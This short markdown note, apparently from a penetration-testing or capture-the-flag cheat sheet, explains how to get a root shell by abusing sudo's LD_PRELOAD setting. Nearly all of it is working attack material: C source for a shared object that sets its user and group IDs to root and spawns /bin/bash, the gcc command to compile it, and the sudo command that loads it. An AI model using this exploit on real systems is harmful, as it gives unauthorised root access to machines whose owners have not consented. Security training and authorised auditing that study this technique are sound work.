- - -

### LD_PRELOAD :

```sh
sudo -l
```

![Imgur](https://i.imgur.com/b1CMg8q.png)

Create a File named "shell.c" inside /tmp directory.

```
cat shell.c
```

```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
void _init() {  
        unsetenv("LD_PRELOAD");  
        setgid(0);  
        setuid(0);  
        system("/bin/bash");  
}
```

```sh
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

```sh
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/<what_is_in_your_sudo_>
```

> [! NOTE ] 
>  In the above command we have to **put the full path to the shell.so** file, Otherwise it will not work.

more details : [c0nd4.medium.com](https://c0nd4.medium.com/linux-sudo-ld-preload-privilege-escalation-7e1e17d544ec)

- - -

